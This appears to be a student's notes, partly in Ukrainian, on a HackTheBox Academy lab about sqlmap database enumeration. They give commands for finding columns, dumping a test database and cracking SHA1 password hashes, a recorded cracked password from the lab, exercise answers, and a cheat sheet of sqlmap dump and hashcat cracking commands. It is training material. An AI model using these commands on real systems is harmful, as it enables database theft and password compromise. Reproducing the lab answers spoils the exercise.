# SQLMap — DB Enumeration & Data Extraction

## Модуль
[SQLMap Essentials — Database Enumeration](https://academy.hackthebox.com/app/module/58/section/529)

## Команди

### Пошук колонки за шаблоном
```bash
sqlmap -u "http://TARGET/case1.php?id=1" \
  --search -C style \
  --batch
# --search -C → шукає колонки LIKE 'style' у всіх БД
# → знайдено: PARAMETER_STYLE (information_schema.ROUTINES)
```

### Отримати схему БД + дамп з крекінгом хешів
```bash
sqlmap -u "http://TARGET/case1.php?id=1" \
  --schema -D testdb \
  --dump \
  --batch
# --schema → показує структуру всіх таблиць в БД
# --dump   → дампить всі дані
# sqlmap автоматично детектує SHA1 хеші і крекає через вбудований словник
```

## Результати

### Структура testdb
Table: users (9 columns)
id, name, address, birthday, cc, email, occupation, password, phone
Table: flag1 (2 columns)
id, content

### Kimberly Wright (id=6)
email: KimberlyMWright@gmail.com
password: d642ff0feca378666a8727947482f1a4702deba0
cracked: Enizoom1609

## Відповіді

| Q | Відповідь |
|---|-----------|
| Column containing "style" | `PARAMETER_STYLE` |
| Kimberly's password | `Enizoom1609` |

---

## SQLMap Enumeration — шпаргалка команд

```bash
# Список БД
sqlmap -u "URL" --dbs --batch

# Список таблиць
sqlmap -u "URL" -D dbname --tables --batch

# Структура таблиць (схема)
sqlmap -u "URL" -D dbname --schema --batch

# Дамп конкретної таблиці
sqlmap -u "URL" -D dbname -T tablename --dump --batch

# Дамп конкретних колонок
sqlmap -u "URL" -D dbname -T tablename -C col1,col2 --dump --batch

# Пошук таблиці за назвою
sqlmap -u "URL" --search -T users --batch

# Пошук колонки за назвою
sqlmap -u "URL" --search -C password --batch

# Пошук з LIKE
sqlmap -u "URL" --search -C style --batch
# → шукає всі колонки що містять 'style'
```

## Hash Cracking в sqlmap

```bash
# sqlmap автоматично:
# 1. Детектує хеш-алгоритм (MD5, SHA1, bcrypt...)
# 2. Пропонує крекінг через вбудований словник
# 3. Зберігає результати в сесію

# Вбудований словник:
/usr/share/sqlmap/data/txt/wordlist.tx_

# Для складніших хешів — зберегти і крекати зовнішнім інструментом:
hashcat -m 100 hashes.txt rockyou.txt   # SHA1
hashcat -m 0   hashes.txt rockyou.txt   # MD5
```
